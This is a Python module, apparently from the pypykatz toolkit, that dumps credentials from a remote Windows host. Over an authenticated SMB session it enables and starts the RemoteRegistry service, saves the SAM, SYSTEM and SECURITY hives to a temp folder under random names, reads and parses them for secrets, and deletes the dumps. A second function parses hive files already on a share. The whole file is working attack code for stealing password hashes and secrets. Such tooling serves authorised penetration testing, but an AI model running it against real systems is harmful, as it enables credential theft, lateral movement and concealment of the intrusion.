
import asyncio
import os

from pypykatz import logging

async def regdump(url, hives = ['HKLM\\SAM', 'HKLM\\SYSTEM', 'HKLM\\SECURITY'], remote_base_path = 'C:\\Windows\\Temp\\', remote_share_name = '\\c$\\Windows\\Temp\\', enable_wait = 3):
	from aiosmb.commons.connection.url import SMBConnectionURL
	from aiosmb.commons.interfaces.machine import SMBMachine
	from aiosmb.commons.interfaces.file import SMBFile
	from aiosmb.dcerpc.v5.common.service import SMBServiceStatus
	from pypykatz.alsadecryptor.asbmfile import SMBFileReader
	from pypykatz.registry.aoffline_parser import OffineRegistry

	

	smburl = SMBConnectionURL(url)
	connection = smburl.get_connection()
	if remote_base_path.endswith('\\') is False:
		remote_base_path += '\\'

	if remote_share_name.endswith('\\') is False:
		remote_share_name += '\\'

	po = None

	async with connection:
		logging.debug('[REGDUMP] Connecting to server...')
		_, err = await connection.login()
		if err is not None:
			raise err
		
		logging.debug('[REGDUMP] Connected to server!')
		async with SMBMachine(connection) as machine:
			logging.debug('[REGDUMP] Checking remote registry service status...')
			status, err = await machine.check_service_status('RemoteRegistry')
			if err is not None:
				raise err
			
			logging.debug('[REGDUMP] Remote registry service status: %s' % status.name)
			if status != SMBServiceStatus.RUNNING:
				logging.debug('[REGDUMP] Enabling Remote registry service')
				_, err = await machine.enable_service('RemoteRegistry')
				if err is not None:
					raise err
				logging.debug('[REGDUMP] Starting Remote registry service')
				_, err = await machine.start_service('RemoteRegistry')
				if err is not None:
					raise err

				await asyncio.sleep(enable_wait)

			
			
			logging.debug('[REGDUMP] Remote registry service should be running now...')
			files = {}
			for hive in hives:
				fname = '%s.%s' % (os.urandom(4).hex(), os.urandom(3).hex())
				remote_path = remote_base_path + fname
				remote_sharepath = remote_share_name + fname
				remote_file = SMBFileReader(SMBFile.from_remotepath(connection, remote_sharepath))
				files[hive.split('\\')[1].upper()] = remote_file
				
				logging.info('[REGDUMP] Dumping reghive %s to (remote) %s' % (hive, remote_path))
				_, err = await machine.save_registry_hive(hive, remote_path)
				if err is not None:
					raise err
			
			#await asyncio.sleep(1)
			for rfilename in files:
				rfile = files[rfilename]
				logging.debug('[REGDUMP] Opening reghive file %s' % rfilename)
				_, err = await rfile.open(connection)
				if err is not None:
					raise err
			
			try:
				logging.debug('[REGDUMP] Parsing hives...')
				po = await OffineRegistry.from_async_reader(
					files['SYSTEM'], 
					sam_reader = files.get('SAM'), 
					security_reader = files.get('SECURITY'), 
					software_reader = files.get('SOFTWARE')
				)
			except Exception as e:
				print(e)
			
			logging.debug('[REGDUMP] Hives parsed OK!')
			
			logging.debug('[REGDUMP] Deleting remote files...')
			err = None
			for rfilename in files:
				rfile = files[rfilename]
				err = await rfile.close()
				if err is not None:
					logging.info('[REGDUMP] ERR! Failed to close hive dump file! %s' % rfilename)

				_, err = await rfile.delete()
				if err is not None:
					logging.info('[REGDUMP] ERR! Failed to delete hive dump file! %s' % rfilename)
			
			if err is None:
				logging.info('[REGDUMP] Deleting remote files OK!')
	return po

			

async def regfile(url, system, sam = None, security = None, software = None, smb_basepath = None):
	from aiosmb.commons.connection.url import SMBConnectionURL
	from aiosmb.commons.interfaces.file import SMBFile
	from pypykatz.alsadecryptor.asbmfile import SMBFileReader
	from pypykatz.registry.aoffline_parser import OffineRegistry

	smburl = SMBConnectionURL(url)
	connection = smburl.get_connection()

	if smb_basepath is None:
		smb_basepath = smburl.path
	if smb_basepath.endswith('/') is False:
		smb_basepath += '/'
	smb_basepath = smb_basepath.replace('/', '\\')
			
	system_smbfile_path = smb_basepath + system
	sam_smbfile = None
	security_smbfile = None
	software_smbfile = None


	system_smbfile = SMBFileReader(SMBFile.from_remotepath(connection, system_smbfile_path))

	if sam:
		sam_smbfile_path = smb_basepath + sam
		sam_smbfile = SMBFileReader(SMBFile.from_remotepath(connection, sam_smbfile_path))
			
	if security:
		security_smbfile_path = smb_basepath + security
		security_smbfile = SMBFileReader(SMBFile.from_remotepath(connection, security_smbfile_path))
			
	if software:
		software_smbfile_path = smb_basepath + software
		software_smbfile = SMBFileReader(SMBFile.from_remotepath(connection, software_smbfile_path))

	po = None
	async with connection:
		logging.debug('[REGFILE] Connecting to server...')
		_, err = await connection.login()
		if err is not None:
			raise err
		
		logging.debug('[REGFILE] Connected to server!')
		logging.debug('[REGFILE] Opening SYSTEM hive dump file...')
		# parse files here
		_, err = await system_smbfile.open(connection)
		if err is not None:
			raise err

		if sam_smbfile is not None:
			logging.debug('[REGFILE] Opening SAM hive dump file...')
			_, err = await sam_smbfile.open(connection)
			if err is not None:
				raise err
				
		if security_smbfile is not None:
			logging.debug('[REGFILE] Opening SECURITY hive dump file...')
			_, err = await security_smbfile.open(connection)
			if err is not None:
				raise err
				
		if software_smbfile is not None:
			logging.debug('[REGFILE] Opening SOFTWARE hive dump file...')
			_, err = await software_smbfile.open(connection)
			if err is not None:
				raise err
		
		logging.debug('[REGFILE] All files opened OK!')
		logging.debug('[REGFILE] Parsing hive files...')
		po = await OffineRegistry.from_async_reader(system_smbfile, sam_reader = sam_smbfile, security_reader = security_smbfile, software_reader = software_smbfile)
		logging.debug('[REGFILE] Hive files parsed OK!')

	return po